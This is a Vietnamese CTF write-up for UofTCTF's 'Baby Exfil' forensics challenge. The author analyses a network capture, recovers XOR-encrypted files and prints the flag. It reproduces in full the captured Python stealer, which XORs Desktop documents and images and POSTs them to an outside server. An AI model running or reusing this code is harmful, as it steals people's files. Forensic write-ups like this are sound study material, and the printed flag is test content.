## Baby Exfil

<img width="1364" height="416" alt="image" src="https://github.com/user-attachments/assets/bbe5a10e-32c7-4ef8-8edd-2825bc70c741" />

**Link tải file:** https://play.uoftctf.org/files/9844c1d7af5d5cc5dee477bfc8f54c63/final.pcapng?token=eyJ1c2VyX2lkIjoxMzg3LCJ0ZWFtX2lkIjo2MTUsImZpbGVfaWQiOjY2fQ.aWMTkw.DBDHiZ6IpNO934NOQzqebcsUXe8

Ở đây thì description của đề cho chúng ta biết là có những hoạt động khả nghi đã diễn ra trong mạng của máy của họ. Và nó đang đánh cắp các thông tin mật của máy, giờ họ cần mình tìm ra cái hoạt động khả nghi đó.

Khi mở file `pcapng` em dựa vào thông tin của đề là, có một ai đó đang cố gắng đánh cắp dữ liệu, thì có thể nó sẽ tạo ra một kết nối tới server và thực hiện request "POST" dữ liệu lên cho server, nên em filter vào giao thức `HTTP` để kiểm tra trước.

<img width="1915" height="365" alt="image" src="https://github.com/user-attachments/assets/eb567a32-3117-4d35-92d8-be579bd9c945" />

Em thấy ở đây ip máy nạn nhân là `10.0.2.15` đang thực hiện tải về một source script và server ip là `35.238.80.16` đã có trạng thái hoàn thành việc gửi script python về máy nạn nhân. Giờ em export file source code này ra để xem nội dung bên trong.

```python
import os
import requests

key = "G0G0Squ1d3Ncrypt10n"
server = "http://34.134.77.90:8080/upload"

def xor_file(data, key):
    result = bytearray()
    for i in range(len(data)):
        result.append(data[i] ^ ord(key[i % len(key)]))
    return bytes(result)

base_path = r"C:\Users\squid\Desktop"
extensions = ['.docx', '.png', ".jpeg", ".jpg"]

for root, dirs, files in os.walk(base_path):
    for file in files:
        if any(file.endswith(ext) for ext in extensions):
            filepath = os.path.join(root, file)
            try:
                with open(filepath, 'rb') as f:
                    content = f.read()
                
                encrypted = xor_file(content, key)
                hex_data = encrypted.hex()
                requests.post(server, files={'file': (file, hex_data)})
                
                print(f"Sent: {file}")
            except:
                pass

```
Code này thực hiện việc tạo một kết nối đến server và thực hiện request `upload` tức là `POST` dữ liệu trong máy nạn nhân lên cho server. Chi tiết hơn là:
  
  - Đầu tiên nó thực hiện tạo ra 1 key `G0G0Squ1d3Ncrypt10n` để xor.

  - Tiếp theo là nó tạo ra một hàm xor với key đó qua từng byte của data.

  - Nó thực hiện tạo ra nơi mà những dữ liệu của người dùng sẽ gửi về cho server và bị mã hóa - ở đây là trong thư mục `Desktop`. Nó duyệt qua những file có extention là `.docx, .png, .jpd, .jpeg`.

  - Sau đó nó đọc từng byte của những file đó xor nó với key, rồi mã hóa thành dạng hex và thực hiện gửi lên cho server.


<img width="1260" height="874" alt="image" src="https://github.com/user-attachments/assets/d277d8cd-f41f-472f-8d8b-fd19e7306d14" />

Bây giờ em sẽ thực hiện chuyển chuỗi hex trong gói tin POST lên từ máy nạn nhân sang byte và thực hiện phép XOR với key `G0G0Squ1d3Ncrypt10n`, vì trong đề khong có thông tin nào thêm nên em nghĩ là mình sẽ thực hiện giải mã với tất cả các gói tin.

<img width="952" height="371" alt="image" src="https://github.com/user-attachments/assets/a2d683bc-1f8b-4878-b345-b67ece7174d2" />

**Flag: uofctf{b4by_w1r3sh4rk_an4lys1s}**

